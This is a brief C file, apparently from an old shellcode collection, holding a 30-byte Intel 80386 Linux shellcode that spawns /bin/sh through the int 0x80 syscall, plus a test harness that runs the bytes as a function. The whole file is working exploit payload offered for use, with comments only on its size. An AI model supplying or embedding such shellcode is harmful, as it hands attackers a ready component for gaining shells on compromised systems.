/* nirosys@0xcd80.org
 * * * * * * * * * * * * * * * *
 * Traditional /bin/sh shellcode.
 * In 30bytes.. Could be better 
 * but, it sure beats the 48 
 * byte shellcode i used previously.
 * (barely)
 * * * * * * * * * * * * * * * */


/* 32 bytes */
/* Architecture: Intel 80386            */
char shellcode[] = {
        "\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"
        "\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"
};

int main( int argc, char **argv ) {
	void (*foo)();
	foo = (void *)shellcode;
	foo();
}
